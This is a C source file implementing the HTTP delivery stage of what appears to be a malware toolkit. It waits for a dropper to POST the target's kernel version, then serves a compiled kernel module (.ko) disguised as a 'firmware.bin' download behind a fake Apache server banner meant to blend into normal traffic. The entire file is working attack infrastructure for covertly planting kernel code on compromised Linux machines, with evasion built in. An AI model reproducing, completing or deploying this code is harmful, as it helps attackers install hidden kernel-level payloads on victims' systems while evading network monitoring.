/**
 * @file http.c
 * @brief HTTP covert delivery — implementation.
 */

#define _POSIX_C_SOURCE 200809L

#include "http.h"

#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define KO_SIZE_MAX (8 * 1024 * 1024)

/* Fake server banner to blend in with normal web traffic. */
static const char *FAKE_SERVER = "Apache/2.4.57 (Ubuntu)";

/**
 * @brief Send exactly n bytes to fd.
 *
 * @param fd   Socket file descriptor.
 * @param buf  Source buffer.
 * @param n    Byte count.
 * @return     0 on success, -1 on error.
 */
static int send_exact(int fd, const void *buf, size_t n)
{
    const char *p    = (const char *)buf;
    size_t      done = 0;

    while (done < n) {
        ssize_t s = send(fd, p + done, n - done, 0);
        if (s <= 0)
            return -1;
        done += (size_t)s;
    }
    return 0;
}

/**
 * @brief Listen for one HTTP dropper request and extract the kernel version.
 *
 * Accepts one TCP connection on @p port, reads the raw HTTP request and
 * extracts the kernel version from the POST body. The socket is kept open
 * for the caller to send back the payload via http_send_payload().
 *
 * @param port      TCP port to listen on.
 * @param kver_out  Output buffer for the kernel version string.
 * @param kver_max  Size of kver_out.
 * @return          Connected socket fd on success, -1 on error.
 */
int http_wait_dropper(uint16_t port, char *kver_out, size_t kver_max)
{
    struct sockaddr_in addr;
    socklen_t          addrlen = sizeof(addr);
    int                srv;
    int                cli;
    int                opt = 1;
    char               req[HTTP_REQ_MAX];
    ssize_t            n;
    char              *body;

    srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv < 0)
        return -1;

    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons(port);

    if (bind(srv, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(srv);
        return -1;
    }

    listen(srv, 1);

    cli = accept(srv, (struct sockaddr *)&addr, &addrlen);
    close(srv);
    if (cli < 0)
        return -1;

    n = recv(cli, req, sizeof(req) - 1, 0);
    if (n <= 0) {
        close(cli);
        return -1;
    }
    req[n] = '\0';

    /*
     * Extract kernel version from the POST body.
     * The body starts after the blank line "\r\n\r\n".
     */
    body = strstr(req, "\r\n\r\n");
    if (!body) {
        close(cli);
        return -1;
    }
    body += 4;

    strncpy(kver_out, body, kver_max - 1);
    kver_out[kver_max - 1] = '\0';

    /* strip trailing whitespace */
    size_t len = strlen(kver_out);
    while (len > 0 && (kver_out[len - 1] == '\r'
                       || kver_out[len - 1] == '\n'
                       || kver_out[len - 1] == ' '))
        kver_out[--len] = '\0';

    return cli;
}

/**
 * @brief Send the .ko payload as an HTTP 200 response.
 *
 * Sends HTTP headers disguised as a firmware update, followed by the
 * raw .ko binary as the response body.
 *
 * @param sock     Connected socket from http_wait_dropper().
 * @param ko_path  Path to the compiled .ko file.
 * @return         0 on success, -1 on error.
 */
int http_send_payload(int sock, const char *ko_path)
{
    FILE    *f;
    uint8_t *buf;
    long     sz;
    char     headers[512];
    int      ret = -1;

    f = fopen(ko_path, "rb");
    if (!f)
        return -1;

    fseek(f, 0, SEEK_END);
    sz = ftell(f);
    rewind(f);

    if (sz <= 0 || sz > KO_SIZE_MAX) {
        fclose(f);
        return -1;
    }

    buf = malloc((size_t)sz);
    if (!buf) {
        fclose(f);
        return -1;
    }

    if ((long)fread(buf, 1, (size_t)sz, f) != sz) {
        fclose(f);
        free(buf);
        return -1;
    }
    fclose(f);

    snprintf(headers, sizeof(headers),
             "HTTP/1.1 200 OK\r\n"
             "Server: %s\r\n"
             "Content-Type: application/octet-stream\r\n"
             "Content-Disposition: attachment; filename=\"firmware.bin\"\r\n"
             "Content-Length: %ld\r\n"
             "Connection: close\r\n"
             "\r\n",
             FAKE_SERVER, sz);

    if (send_exact(sock, headers, strlen(headers)) == 0
        && send_exact(sock, buf, (size_t)sz) == 0)
        ret = 0;

    free(buf);
    close(sock);
    return ret;
}
